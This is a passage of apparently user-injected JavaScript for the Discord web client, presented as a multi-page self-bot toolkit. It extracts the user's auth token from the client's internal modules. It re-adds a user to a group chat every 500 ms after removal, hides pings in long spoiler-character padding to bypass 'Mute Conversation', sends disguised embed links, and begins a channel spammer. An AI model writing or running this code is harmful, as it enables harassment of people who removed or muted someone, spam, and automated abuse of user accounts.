  startStopButton2.style.border = '1px solid white';
  startStopButton2.style.cursor = 'pointer';
  startStopButton2.style.width = '100%';
  startStopButton2.style.fontSize = '16px';
  uiContainer8.appendChild(startStopButton2);

  // Status label
  const statusLabel2 = document.createElement('div');
  statusLabel2.textContent = 'Status: Idle';
  statusLabel2.style.color = 'white';
  uiContainer8.appendChild(statusLabel2);

  // Variables for state management
  let isChecking = false;
  let intervalId = null;

  // Function to get the authorization token
  function getToken() {
    return (webpackChunkdiscord_app.push([[''], {}, e => {
      m = [];
      for (let c in e.c) m.push(e.c[c]);
    }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();
  }

  // Function to fetch the channel data
  async function fetchChannelData(groupId) {
    const response = await fetch(`https://discord.com/api/v9/channels/${groupId}`, {
      headers: {
        "accept-language": "en-US,en;q=0.9",
        "authorization": getToken()
      },
      method: "GET"
    });

    if (!response.ok) {
      throw new Error(`Network response was not ok: ${response.statusText}`);
    }

    return response.json();
  }

  // Function to add a recipient
  async function addRecipient(groupId, userId) {
    const response = await fetch(`https://discord.com/api/v9/channels/${groupId}/recipients/${userId}`, {
      headers: {
        "accept-language": "en-US,en;q=0.9",
        "authorization": getToken()
      },
      method: "PUT"
    });

    if (!response.ok) {
      console.error('Failed to add recipient:', response.status, response.statusText);
    }
  }

  // Function to check if the user ID is in the recipients
  async function checkRecipients(userId) {
    const groupId = groupIdInput2.value.trim();

    if (!groupId || !userId) {
      statusLabel2.textContent = 'Status: Please provide a Group ID and User ID.';
      return;
    }

    try {
      const data = await fetchChannelData(groupId);
      const recipientIds = data.recipients.map(recipient => recipient.id);

      if (!recipientIds.includes(userId)) {
        await addRecipient(groupId, userId);
      }
    } catch (error) {
      console.error('Error checking recipients:', error);
    }
  }

  // Handle Start/Stop button click
  startStopButton2.addEventListener('click', () => {
    if (isChecking) {
      clearInterval(intervalId);
      intervalId = null;
      startStopButton2.textContent = 'Start';
      statusLabel2.textContent = 'Status: Stopped';
    } else {
      const userIdInput2s = Array.from(userIdContainer2.querySelectorAll('input'));

      let currentIndex = 0;
      intervalId = setInterval(() => {
        if (userIdInput2s.length === 0) return;

        const userIdInput2 = userIdInput2s[currentIndex];
        const userId = userIdInput2.value.trim();

        if (userId) {
          checkRecipients(userId);
        }

        currentIndex = (currentIndex + 1) % userIdInput2s.length;
      }, 500); // Check every 500ms

      startStopButton2.textContent = 'Stop';
      statusLabel2.textContent = 'Status: Checking...';
    }
    isChecking = !isChecking;
  });
})();









(function() {
    // Create the main UI container
    const uiContainer9 = document.createElement('div');
    uiContainer9.style.position = 'fixed';
    uiContainer9.style.bottom = '20px';
    uiContainer9.style.right = '20px';
    uiContainer9.style.width = '350px';
    uiContainer9.style.backgroundColor = 'black';
    uiContainer9.style.color = 'white';
    uiContainer9.style.zIndex = '2000';
    uiContainer9.style.display = 'none';
    uiContainer9.style.flexDirection = 'column';
    uiContainer9.style.justifyContent = 'space-between';
    uiContainer9.style.alignItems = 'center';
    uiContainer9.style.padding = '20px';
    uiContainer9.style.border = '1px solid white';
    uiContainer9.style.borderRadius = '10px';
    uiContainer9.style.fontFamily = 'GG Sans, sans-serif';
    document.body.appendChild(uiContainer9);

// Create and style the open button for the new UI container
const openNewButton9 = document.createElement('button');
openNewButton9.textContent = 'Page 9';
openNewButton9.style.position = 'fixed';
openNewButton9.style.bottom = '140px';
openNewButton9.style.right = '60px';
openNewButton9.style.zIndex = '1000';
openNewButton9.style.padding = '10px';
openNewButton9.style.backgroundColor = '#333';
openNewButton9.style.color = 'white';
openNewButton9.style.border = 'none';
openNewButton9.style.borderRadius = '5px';
document.body.appendChild(openNewButton9);

// Create and style the close button for the new UI container
const closeNewButton9 = document.createElement('button');
closeNewButton9.textContent = 'Close';
closeNewButton9.style.padding = '10px';
closeNewButton9.style.backgroundColor = '#333';
closeNewButton9.style.color = 'white';
closeNewButton9.style.border = 'none';
closeNewButton9.style.borderRadius = '5px';
closeNewButton9.style.marginTop = '10px';
uiContainer9.appendChild(closeNewButton9);

// Show the new UI container when the open button is pressed
openNewButton9.addEventListener('click', () => {
  uiContainer9.style.display = 'block';
  openNewButton9.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton9.addEventListener('click', () => {
  uiContainer9.style.display = 'none';
  openNewButton9.style.display = 'block';
});

    // Create the title label
    const titleLabel9 = document.createElement('h1');
    titleLabel9.textContent = `Bypass "Mute Conversation"`;
    titleLabel9.style.fontSize = '24px';
    titleLabel9.style.marginBottom = '20px';
    uiContainer9.appendChild(titleLabel9);

    // Create the recipients input field
    const recipientsInput = document.createElement('input');
    recipientsInput.type = 'text';
    recipientsInput.placeholder = 'Recipients (comma separated)';
    recipientsInput.id = 'recipients';
    recipientsInput.style.marginBottom = '20px';
    recipientsInput.style.padding = '10px';
    recipientsInput.style.backgroundColor = 'black';
    recipientsInput.style.color = 'white';
    recipientsInput.style.border = '1px solid white';
    recipientsInput.style.width = '100%';
    recipientsInput.style.fontSize = '16px';
    uiContainer9.appendChild(recipientsInput);

    // Create the message input field
    const messageInput3 = document.createElement('textarea');
    messageInput3.placeholder = 'Message';
    messageInput3.id = 'message';
    messageInput3.style.marginBottom = '20px';
    messageInput3.style.padding = '10px';
    messageInput3.style.backgroundColor = 'black';
    messageInput3.style.color = 'white';
    messageInput3.style.border = '1px solid white';
    messageInput3.style.width = '100%';
    messageInput3.style.height = '100px';
    messageInput3.style.fontSize = '16px';
    uiContainer9.appendChild(messageInput3);

    // Create the Send button
    const sendButton5 = document.createElement('button');
    sendButton5.textContent = 'Send';
    sendButton5.style.marginBottom = '20px';
    sendButton5.style.padding = '10px';
    sendButton5.style.backgroundColor = 'black';
    sendButton5.style.color = 'white';
    sendButton5.style.border = '1px solid white';
    sendButton5.style.cursor = 'pointer';
    sendButton5.style.width = '100%';
    sendButton5.style.fontSize = '16px';
    uiContainer9.appendChild(sendButton5);

    // Function to fetch the token
    function getToken() {
        return (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m)
            .find(m => m?.exports?.default?.getToken !== void 0)
            .exports.default.getToken();
    }

    // Function to fetch user data by user ID
    async function fetchUserData(userId, token) {
        const response = await fetch(`https://discord.com/api/v9/users/${userId}`, {
            "headers": {
                "accept-language": "en-US",
                "authorization": token
            },
            "method": "GET"
        });

        if (!response.ok) {
            console.error('Error fetching user data:', response.statusText);
            return null;
        }

        return await response.json();
    }

    // Function to fetch channel data and find recipient IDs
    async function fetchRecipientIds(channelId, names) {
        const token = getToken();

        const response = await fetch(`https://discord.com/api/v9/channels/${channelId}`, {
            "headers": {
                "accept-language": "en-US",
                "authorization": token
            },
            "method": "GET"
        });

        if (!response.ok) {
            console.error('Error fetching channel data:', response.statusText);
            return [];
        }

        const data = await response.json();
        const recipients = data.recipients || [];
        const ownerId = data.owner_id;
        let recipientIds = [];

        // Fetch owner data
        let ownerData = null;
        if (ownerId) {
            ownerData = await fetchUserData(ownerId, token);
        }

        names.forEach(name => {
            if (name.toLowerCase() === 'everyone') {
                recipientIds.push('@everyone');
            } else if (name.toLowerCase() === 'here') {
                recipientIds.push('@here');
            } else {
                recipients.forEach(recipient => {
                    if (recipient.global_name?.toLowerCase().includes(name.toLowerCase()) ||
                        recipient.username?.toLowerCase().includes(name.toLowerCase()) ||
                        recipient.id.includes(name)) {
                        recipientIds.push(recipient.id);
                    }
                });

                if (ownerData && (ownerData.global_name?.toLowerCase().includes(name.toLowerCase()) ||
                    ownerData.username?.toLowerCase().includes(name.toLowerCase()) ||
                    ownerId.includes(name))) {
                    recipientIds.push(ownerId);
                }
            }
        });

        return recipientIds;
    }

    // Function to send message
    async function sendMessage() {
        const channelId = window.location.href.split('/').pop();
        const message = document.getElementById('message').value.trim();
        const recipientsInputValue = document.getElementById('recipients').value.trim();

        if (!message || !recipientsInputValue) {
            console.error('Message and recipients are required.');
            return;
        }

        const recipientNames = recipientsInputValue.split(',').map(name => name.trim()).filter(name => name);
        if (recipientNames.length === 0) {
            console.error('No recipients provided.');
            return;
        }

        const recipientIds = await fetchRecipientIds(channelId, recipientNames);

        if (recipientIds.length === 0) {
            console.error('No recipients found.');
            return;
        }

        const mentions = recipientIds.map(id => (id.startsWith('@') ? id : `<@${id}>`)).join('');
        const finalMessage = `${message}||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||_​_​_​_​_​_${mentions} `;

        const token = getToken();

        const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
            "headers": {
                "accept-language": "en-US",
                "authorization": token,
                "content-type": "application/json"
            },
            "body": JSON.stringify({
                "content": finalMessage,
                "tts": false,
                "flags": 0
            }),
            "method": "POST"
        });

        if (response.ok) {
            console.log('Message sent successfully');
        } else {
            console.error('Error sending message:', response.statusText);
        }
    }

    // Handle the Send button click
    sendButton5.addEventListener('click', sendMessage);
})();








(function() {
    // Include the LZString library
    (function(global){
        var f = String.fromCharCode;
        var keyStrBase64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        var keyStrUriSafe = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-$";
        var baseReverseDic = {};
        
        function getBaseValue(alphabet, character) {
            if (!baseReverseDic[alphabet]) {
                baseReverseDic[alphabet] = {};
                for (var i=0 ; i<alphabet.length ; i++) {
                    baseReverseDic[alphabet][alphabet.charAt(i)] = i;
                }
            }
            return baseReverseDic[alphabet][character];
        }
        
        var LZString = {
            compressToEncodedURIComponent : function (input) {
                if (input == null) return "";
                return LZString._compress(input, 6, function(a){return keyStrUriSafe.charAt(a);});
            },
            _compress: function (uncompressed, bitsPerChar, getCharFromInt) {
                if (uncompressed == null) return "";
                var i, value,
                    context_dictionary= {},
                    context_dictionaryToCreate= {},
                    context_c="",
                    context_wc="",
                    context_w="",
                    context_enlargeIn= 2, // Compensate for the first entry which should not count
                    context_dictSize= 3,
                    context_numBits= 2,
                    context_data=[],
                    context_data_val=0,
                    context_data_position=0,
                    ii;
        
                for (ii = 0; ii < uncompressed.length; ii += 1) {
                    context_c = uncompressed.charAt(ii);
                    if (!Object.prototype.hasOwnProperty.call(context_dictionary,context_c)) {
                        context_dictionary[context_c] = context_dictSize++;
                        context_dictionaryToCreate[context_c] = true;
                    }
        
                    context_wc = context_w + context_c;
                    if (Object.prototype.hasOwnProperty.call(context_dictionary,context_wc)) {
                        context_w = context_wc;
                    } else {
                        if (Object.prototype.hasOwnProperty.call(context_dictionaryToCreate,context_w)) {
                            if (context_w.charCodeAt(0)<256) {
                                for (i=0 ; i<context_numBits ; i++) {
                                    context_data_val = (context_data_val << 1);
                                    if (context_data_position == bitsPerChar-1) {
                                        context_data_position = 0;
                                        context_data.push(getCharFromInt(context_data_val));
                                        context_data_val = 0;
                                    } else {
                                        context_data_position++;
                                    }
                                }
                                value = context_w.charCodeAt(0);
                                for (i=0 ; i<8 ; i++) {
                                    context_data_val = (context_data_val << 1) | (value&1);
                                    if (context_data_position == bitsPerChar-1) {
                                        context_data_position = 0;
                                        context_data.push(getCharFromInt(context_data_val));
                                        context_data_val = 0;
                                    } else {
                                        context_data_position++;
                                    }
                                    value = value >> 1;
                                }
                            } else {
                                value = 1;
                                for (i=0 ; i<context_numBits ; i++) {
                                    context_data_val = (context_data_val << 1) | value;
                                    if (context_data_position == bitsPerChar-1) {
                                        context_data_position = 0;
                                        context_data.push(getCharFromInt(context_data_val));
                                        context_data_val = 0;
                                    } else {
                                        context_data_position++;
                                    }
                                    value = 0;
                                }
                                value = context_w.charCodeAt(0);
                                for (i=0 ; i<16 ; i++) {
                                    context_data_val = (context_data_val << 1) | (value&1);
                                    if (context_data_position == bitsPerChar-1) {
                                        context_data_position = 0;
                                        context_data.push(getCharFromInt(context_data_val));
                                        context_data_val = 0;
                                    } else {
                                        context_data_position++;
                                    }
                                    value = value >> 1;
                                }
                            }
                            context_enlargeIn--;
                            if (context_enlargeIn == 0) {
                                context_enlargeIn = Math.pow(2, context_numBits);
                                context_numBits++;
                            }
                            delete context_dictionaryToCreate[context_w];
                        } else {
                            value = context_dictionary[context_w];
                            for (i=0 ; i<context_numBits ; i++) {
                                context_data_val = (context_data_val << 1) | (value&1);
                                if (context_data_position == bitsPerChar-1) {
                                    context_data_position = 0;
                                    context_data.push(getCharFromInt(context_data_val));
                                    context_data_val = 0;
                                } else {
                                    context_data_position++;
                                }
                                value = value >> 1;
                            }
                        }
                        context_enlargeIn--;
                        if (context_enlargeIn == 0) {
                            context_enlargeIn = Math.pow(2, context_numBits);
                            context_numBits++;
                        }
                        // Add wc to the dictionary.
                        context_dictionary[context_wc] = context_dictSize++;
                        context_w = String(context_c);
                    }
                }
        
                // Output the code for w.
                if (context_w !== "") {
                    if (Object.prototype.hasOwnProperty.call(context_dictionaryToCreate,context_w)) {
                        if (context_w.charCodeAt(0)<256) {
                            for (i=0 ; i<context_numBits ; i++) {
                                context_data_val = (context_data_val << 1);
                                if (context_data_position == bitsPerChar-1) {
                                    context_data_position = 0;
                                    context_data.push(getCharFromInt(context_data_val));
                                    context_data_val = 0;
                                } else {
                                    context_data_position++;
                                }
                            }
                            value = context_w.charCodeAt(0);
                            for (i=0 ; i<8 ; i++) {
                                context_data_val = (context_data_val << 1) | (value&1);
                                if (context_data_position == bitsPerChar-1) {
                                    context_data_position = 0;
                                    context_data.push(getCharFromInt(context_data_val));
                                    context_data_val = 0;
                                } else {
                                    context_data_position++;
                                }
                                value = value >> 1;
                            }
                        } else {
                            value = 1;
                            for (i=0 ; i<context_numBits ; i++) {
                                context_data_val = (context_data_val << 1) | value;
                                if (context_data_position == bitsPerChar-1) {
                                    context_data_position = 0;
                                    context_data.push(getCharFromInt(context_data_val));
                                    context_data_val = 0;
                                } else {
                                    context_data_position++;
                                }
                                value = 0;
                            }
                            value = context_w.charCodeAt(0);
                            for (i=0 ; i<16 ; i++) {
                                context_data_val = (context_data_val << 1) | (value&1);
                                if (context_data_position == bitsPerChar-1) {
                                    context_data_position = 0;
                                    context_data.push(getCharFromInt(context_data_val));
                                    context_data_val = 0;
                                } else {
                                    context_data_position++;
                                }
                                value = value >> 1;
                            }
                        }
                        context_enlargeIn--;
                        if (context_enlargeIn == 0) {
                            context_enlargeIn = Math.pow(2, context_numBits);
                            context_numBits++;
                        }
                        delete context_dictionaryToCreate[context_w];
                    } else {
                        value = context_dictionary[context_w];
                        for (i=0 ; i<context_numBits ; i++) {
                            context_data_val = (context_data_val << 1) | (value&1);
                            if (context_data_position == bitsPerChar-1) {
                                context_data_position = 0;
                                context_data.push(getCharFromInt(context_data_val));
                                context_data_val = 0;
                            } else {
                                context_data_position++;
                            }
                            value = value >> 1;
                        }
                    }
                    context_enlargeIn--;
                    if (context_enlargeIn == 0) {
                        context_enlargeIn = Math.pow(2, context_numBits);
                        context_numBits++;
                    }
                }
        
                // Mark the end of the stream
                value = 2;
                for (i=0 ; i<context_numBits ; i++) {
                    context_data_val = (context_data_val << 1) | (value&1);
                    if (context_data_position == bitsPerChar-1) {
                        context_data_position = 0;
                        context_data.push(getCharFromInt(context_data_val));
                        context_data_val = 0;
                    } else {
                        context_data_position++;
                    }
                    value = value >> 1;
                }
        
                // Flush the last char
                while (true) {
                    context_data_val = (context_data_val << 1);
                    if (context_data_position == bitsPerChar-1) {
                        context_data.push(getCharFromInt(context_data_val));
                        break;
                    }
                    else context_data_position++;
                }
                return context_data.join('');
            },
        };
        
        if (typeof define === 'function' && define.amd) {
            define(function () { return LZString; });
        } else if( typeof module !== 'undefined' && module != null && module.exports != null ) {
            module.exports = LZString
        } else if( typeof angular !== 'undefined' && angular != null && angular.module != null ) {
            angular.module('LZString', []).factory('LZString', function () {
                return LZString;
            });
        } else {
            global.LZString = LZString;
        }
    })(this);

    // Create the main UI container
    const uiContainer10 = document.createElement('div');
    uiContainer10.style.position = 'fixed';
    uiContainer10.style.bottom = '20px';
    uiContainer10.style.right = '20px';
    uiContainer10.style.width = '350px';
    uiContainer10.style.backgroundColor = 'black';
    uiContainer10.style.color = 'white';
    uiContainer10.style.zIndex = '2000';
    uiContainer10.style.display = 'none';
    uiContainer10.style.flexDirection = 'column';
    uiContainer10.style.justifyContent = 'space-between';
    uiContainer10.style.alignItems = 'center';
    uiContainer10.style.padding = '20px';
    uiContainer10.style.border = '1px solid white';
    uiContainer10.style.borderRadius = '10px';
    uiContainer10.style.fontFamily = 'GG Sans, sans-serif';
    document.body.appendChild(uiContainer10);

// Create and style the open button for the new UI container
const openNewButton10 = document.createElement('button');
openNewButton10.textContent = 'Page 10';
openNewButton10.style.position = 'fixed';
openNewButton10.style.bottom = '100px';
openNewButton10.style.right = '182px';
openNewButton10.style.zIndex = '1000';
openNewButton10.style.padding = '10px';
openNewButton10.style.backgroundColor = '#333';
openNewButton10.style.color = 'white';
openNewButton10.style.border = 'none';
openNewButton10.style.borderRadius = '5px';
document.body.appendChild(openNewButton10);

// Create and style the close button for the new UI container
const closeNewButton10 = document.createElement('button');
closeNewButton10.textContent = 'Close';
closeNewButton10.style.position = 'fixed';
closeNewButton10.style.padding = '10px';
closeNewButton10.style.backgroundColor = '#333';
closeNewButton10.style.color = 'white';
closeNewButton10.style.border = 'none';
closeNewButton10.style.borderRadius = '5px';
closeNewButton10.style.bottom = '22px';
uiContainer10.appendChild(closeNewButton10);

// Show the new UI container when the open button is pressed
openNewButton10.addEventListener('click', () => {
  uiContainer10.style.display = 'block';
  openNewButton10.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton10.addEventListener('click', () => {
  uiContainer10.style.display = 'none';
  openNewButton10.style.display = 'block';
});

    // Create the title label
    const titleLabel10 = document.createElement('h1');
    titleLabel10.textContent = 'Embeds';
    titleLabel10.style.fontSize = '24px';
    titleLabel10.style.marginBottom = '20px';
    uiContainer10.appendChild(titleLabel10);

    // Create input fields
    const fields = [
        { placeholder: 'Title', id: 'title' },
        { placeholder: 'Author', id: 'author' },
        { placeholder: 'Color (Hex Code)', id: 'colour' },
        { placeholder: 'Media Type (Image/Video)', id: 'mediaType' },
        { placeholder: 'Media URL', id: 'media' },
        { placeholder: 'Redirect URL', id: 'redirect' }
    ];

    fields.forEach(field => {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = field.placeholder;
        input.id = field.id;
        input.style.marginBottom = '20px';
        input.style.padding = '10px';
        input.style.backgroundColor = 'black';
        input.style.color = 'white';
        input.style.border = '1px solid white';
        input.style.width = '100%';
        input.style.fontSize = '16px';
        uiContainer10.appendChild(input);
    });

    // Create the description textarea
    const descriptionTextarea = document.createElement('textarea');
    descriptionTextarea.placeholder = 'Description';
    descriptionTextarea.id = 'description';
    descriptionTextarea.style.marginBottom = '20px';
    descriptionTextarea.style.padding = '10px';
    descriptionTextarea.style.backgroundColor = 'black';
    descriptionTextarea.style.color = 'white';
    descriptionTextarea.style.border = '1px solid white';
    descriptionTextarea.style.width = '100%';
    descriptionTextarea.style.fontSize = '16px';
    descriptionTextarea.style.height = '100px';
    uiContainer10.appendChild(descriptionTextarea);

    // Create the Large Image checkbox
    const largeImageLabel = document.createElement('label');
    largeImageLabel.textContent = 'Large Image';
    largeImageLabel.style.marginBottom = '10px';
    largeImageLabel.style.fontSize = '16px';
    uiContainer10.appendChild(largeImageLabel);

    const largeImageCheckbox = document.createElement('input');
    largeImageCheckbox.type = 'checkbox';
    largeImageCheckbox.id = 'largeImage';
    largeImageCheckbox.style.marginBottom = '20px';
    uiContainer10.appendChild(largeImageCheckbox);

    // Create the message input
    const messageInput4 = document.createElement('textarea');
    messageInput4.placeholder = 'Message';
    messageInput4.id = 'message';
    messageInput4.style.marginBottom = '20px';
    messageInput4.style.padding = '10px';
    messageInput4.style.backgroundColor = 'black';
    messageInput4.style.color = 'white';
    messageInput4.style.border = '1px solid white';
    messageInput4.style.width = '100%';
    messageInput4.style.height = '100px';
    messageInput4.style.fontSize = '16px';
    uiContainer10.appendChild(messageInput4);

    // Create the Send button
    const sendButton6 = document.createElement('button');
    sendButton6.textContent = 'Send';
    sendButton6.style.marginBottom = '20px';
    sendButton6.style.padding = '10px';
    sendButton6.style.backgroundColor = 'black';
    sendButton6.style.color = 'white';
    sendButton6.style.border = '1px solid white';
    sendButton6.style.cursor = 'pointer';
    sendButton6.style.width = '100%';
    sendButton6.style.fontSize = '16px';
    uiContainer10.appendChild(sendButton6);

    // Function to send message
    async function sendMessage() {
        const author = document.getElementById('author').value.trim();
        const colour = document.getElementById('colour').value.trim();
        const description = document.getElementById('description').value.trim();
        const largeImage = document.getElementById('largeImage').checked;
        const media = document.getElementById('media').value.trim();
        const mediaTypeInput = document.getElementById('mediaType').value.trim().toLowerCase();
        const redirect = document.getElementById('redirect').value.trim();
        const title = document.getElementById('title').value.trim();
        const message = document.getElementById('message').value.trim();

        let mediaType = '';
        if (mediaTypeInput === 'image') {
            mediaType = 'Image';
        } else if (mediaTypeInput === 'video') {
            mediaType = 'Video';
        }

        const embedData = {
            title: title,
            author: author,
            description: description,
            colour: colour,
            colour_hex: colour,
            large_image: largeImage,
            media: media,
            media_type: mediaType,
            redirect: redirect
        };

        const encodedData = LZString.compressToEncodedURIComponent(JSON.stringify(embedData));
        const finalMessage = message + "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||_​_​_​_​_​_https://embed.blankdvth.com/" + encodedData;

        const channelId = window.location.href.split('/').pop();
        const token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]) }]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken();

        const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
            "headers": {
                "accept-language": "en-US",
                "authorization": token,
                "content-type": "application/json"
            },
            "body": JSON.stringify({
                "content": finalMessage,
                "tts": false,
                "flags": 0
            }),
            "method": "POST"
        });

        if (response.ok) {
            console.log('Message sent successfully');
        } else {
            console.error('Error sending message:', response.statusText);
        }
    }

    // Handle the Send button click
    sendButton6.addEventListener('click', sendMessage);
})();










(function() {
  // Create the main UI container
  const uiContainer11 = document.createElement('div');
  uiContainer11.style.position = 'fixed';
  uiContainer11.style.bottom = '20px';
  uiContainer11.style.right = '20px';
  uiContainer11.style.width = '350px';
  uiContainer11.style.height = 'auto';
  uiContainer11.style.backgroundColor = 'black';
  uiContainer11.style.color = 'white';
  uiContainer11.style.zIndex = '2000';
  uiContainer11.style.display = 'none';
  uiContainer11.style.flexDirection = 'column';
  uiContainer11.style.justifyContent = 'space-between';
  uiContainer11.style.alignItems = 'center';
  uiContainer11.style.padding = '20px';
  uiContainer11.style.border = '1px solid white';
  uiContainer11.style.borderRadius = '10px';
  uiContainer11.style.fontFamily = 'GG Sans, sans-serif';
  document.body.appendChild(uiContainer11);

// Create and style the open button for the new UI container
const openNewButton11 = document.createElement('button');
openNewButton11.textContent = 'Page 11';
openNewButton11.style.position = 'fixed';
openNewButton11.style.bottom = '100px';
openNewButton11.style.right = '118px';
openNewButton11.style.zIndex = '1000';
openNewButton11.style.padding = '10px';
openNewButton11.style.backgroundColor = '#333';
openNewButton11.style.color = 'white';
openNewButton11.style.border = 'none';
openNewButton11.style.borderRadius = '5px';
document.body.appendChild(openNewButton11);

// Create and style the close button for the new UI container
const closeNewButton11 = document.createElement('button');
closeNewButton11.textContent = 'Close';
closeNewButton11.style.padding = '10px';
closeNewButton11.style.backgroundColor = '#333';
closeNewButton11.style.color = 'white';
closeNewButton11.style.border = 'none';
closeNewButton11.style.borderRadius = '5px';
closeNewButton11.style.marginTop = '10px';
uiContainer11.appendChild(closeNewButton11);

// Show the new UI container when the open button is pressed
openNewButton11.addEventListener('click', () => {
  uiContainer11.style.display = 'block';
  openNewButton11.style.display = 'none';
});

// Hide the new UI container when the close button is pressed
closeNewButton11.addEventListener('click', () => {
  uiContainer11.style.display = 'none';
  openNewButton11.style.display = 'block';
});

  // Create and append the title label
  const titleLabel11 = document.createElement('h1');
  titleLabel11.textContent = 'Channel Spammer';
  titleLabel11.style.marginBottom = '20px';
  titleLabel11.style.color = 'white';
  titleLabel11.style.fontSize = '24px'; // Increased font size
  uiContainer11.appendChild(titleLabel11);

  // Create and append the speed input
  const speedLabel2 = document.createElement('label');
  speedLabel2.textContent = 'Speed (milliseconds):';
  speedLabel2.style.color = 'white';
  uiContainer11.appendChild(speedLabel2);

  const speedInput2 = document.createElement('input');
  speedInput2.type = 'number';
  speedInput2.value = '1000';
  speedInput2.style.marginBottom = '10px'; // Reduced space to accommodate error and caution labels
  speedInput2.style.padding = '10px';
  speedInput2.style.backgroundColor = 'black';
  speedInput2.style.color = 'white';
  speedInput2.style.border = '1px solid white';
  speedInput2.style.width = '100%';
  speedInput2.style.fontSize = '16px';
  uiContainer11.appendChild(speedInput2);

  // Create and append the error message label
  const errorLabel2 = document.createElement('div');
  errorLabel2.textContent = 'Error: Speed cannot be under 0 milliseconds!';
  errorLabel2.style.color = 'red';
  errorLabel2.style.backgroundColor = 'transparent';
  errorLabel2.style.display = 'none'; // Hidden by default
  errorLabel2.style.marginBottom = '10px';
  uiContainer11.appendChild(errorLabel2);

  // Create and append the caution notice label
  const cautionLabel = document.createElement('div');
  cautionLabel.textContent = 'Caution: Timeouts under 500 milliseconds may cause a message to be sent more than the requested amount.';
  cautionLabel.style.color = 'gold';
  cautionLabel.style.backgroundColor = 'transparent';
  cautionLabel.style.display = 'none'; // Hidden by default
  cautionLabel.style.marginBottom = '20px';
  uiContainer11.appendChild(cautionLabel);

  // Create and append the message count input
  const messageCountLabel = document.createElement('label');
  messageCountLabel.textContent = 'Message count:';
  messageCountLabel.style.color = 'white';
  uiContainer11.appendChild(messageCountLabel);

  const messageCountInput = document.createElement('input');
  messageCountInput.type = 'number';
  messageCountInput.value = '10';
  messageCountInput.style.marginBottom = '20px';
  messageCountInput.style.padding = '10px';
  messageCountInput.style.backgroundColor = 'black';
  messageCountInput.style.color = 'white';
  messageCountInput.style.border = '1px solid white';
  messageCountInput.style.width = '100%';
  messageCountInput.style.fontSize = '16px';
  uiContainer11.appendChild(messageCountInput);

  // Create and append the channel ID input
  const channelIdLabel = document.createElement('label');
  channelIdLabel.textContent = 'Channel ID:';
  channelIdLabel.style.color = 'white';
  uiContainer11.appendChild(channelIdLabel);

  const channelIdInput = document.createElement('input');
  channelIdInput.type = 'text';
  channelIdInput.placeholder = 'Enter Channel ID';
  channelIdInput.style.marginBottom = '20px';
  channelIdInput.style.padding = '10px';
  channelIdInput.style.backgroundColor = 'black';
  channelIdInput.style.color = 'white';
  channelIdInput.style.border = '1px solid white';
  channelIdInput.style.width = '100%';
  channelIdInput.style.fontSize = '16px';
  uiContainer11.appendChild(channelIdInput);

  // Create and append the message input
  const messageLabel3 = document.createElement('label');
  messageLabel3.textContent = 'Message:';
  messageLabel3.style.color = 'white';
  uiContainer11.appendChild(messageLabel3);

  const messageInput5 = document.createElement('input');
  messageInput5.type = 'text';
  messageInput5.placeholder = 'Enter message content';
  messageInput5.style.marginBottom = '20px';
  messageInput5.style.padding = '10px';
  messageInput5.style.backgroundColor = 'black';
  messageInput5.style.color = 'white';
  messageInput5.style.border = '1px solid white';
  messageInput5.style.width = '100%';
  messageInput5.style.fontSize = '16px';
  uiContainer11.appendChild(messageInput5);

  // Create and append the Start button
  const startButton = document.createElement('button');
  startButton.textContent = 'Start';
  startButton.style.marginBottom = '20px';
  startButton.style.padding = '10px';
  startButton.style.backgroundColor = 'black';
  startButton.style.color = 'white';
  startButton.style.border = '1px solid white';
